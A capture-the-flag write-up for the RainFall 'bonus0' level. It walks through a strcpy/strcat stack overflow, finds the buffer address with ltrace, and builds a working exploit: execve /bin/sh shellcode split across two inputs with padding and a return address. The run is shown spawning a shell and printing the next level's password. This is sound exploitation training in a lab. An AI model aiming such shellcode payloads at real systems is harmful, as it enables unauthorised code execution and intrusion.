bonus0
======

*	We spawn with a [bonus0](src/bonus0) executable
	```console
	bonus0@RainFall:~$ ./bonus0 
	- 
	test
	- 
	eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
	test eeeeeeeeeeeeeeeeeeee���
	```
*	The [base code](src/bonus0.c) was a bit messy so I did a little clean up to make it more readable [here](src/bonus0_clean.c)
	-	`main()` :	
		-	creates an array of `54 bytes` -> `result`
		-	`processInput()` with that string
		-	`puts()` the string
	-	`processInput()` :
		-	creates two strings of `20 bytes` each
		-	`readInput()` on both
		-	`strcpy()` the first string into `result`
		-	add ` \0` to the end of `result`
		-	`strcat()` second string with `result`
		-	in the end we should get something like this : `arg1 + arg2 + space + arg2`
	-	`readInput()` :
		-	creates a string `userInput[4104]`
		-	prompt the user with `read()`
		-	replace the `\n` with `\0`
		-	`strncpy()` the input into the first parameter
*	Once again, no obvious exploit here. Let's try to use a shellcode as parameter.
*	The two `input` are next to each other so we should be able to go on the second one by overflowing on the first one. and so put the first part of our shellcode in the first input and the rest in the second.
*	We need to retrieve the address of the start of the buffer in which the shellcode would be stored
	```console
	bonus0@RainFall:~$ ltrace ./bonus0 
	[...]
	strcpy(0xbffff726, "")      = 0xbffff726
	[...]
	```
	we are able to find it with `ltrace` -> `\x26\xf7\xff\xbf`.
*	We also now that our offset is of `54 bytes` thanks to `result`. Let's build the payload:
	- shellcode (20 first bytes in the `argv[1]`) and the 3 bytes left in the start of `argv[2]` -> `20 bytes + 3 bytes`
	- padding -> `11 bytes`
	- address of the buffer -> `4 bytes`
	- last but no least, we need to keep in mind the space the programs add at the end so we will add a random character -> `1 byte`
*	Let's try this
	```console
	bonus0@RainFall:~$ (python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0")'; python -c 'print("\x0b\xcd\x80" + "a"*11 + "\xbf\xff\xf7\x26"[::-1] + "a")'; cat - )| ./bonus0
	[...]
	whoami
	bonus1
	cat /home/user/bonus1/.pass
	cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
	```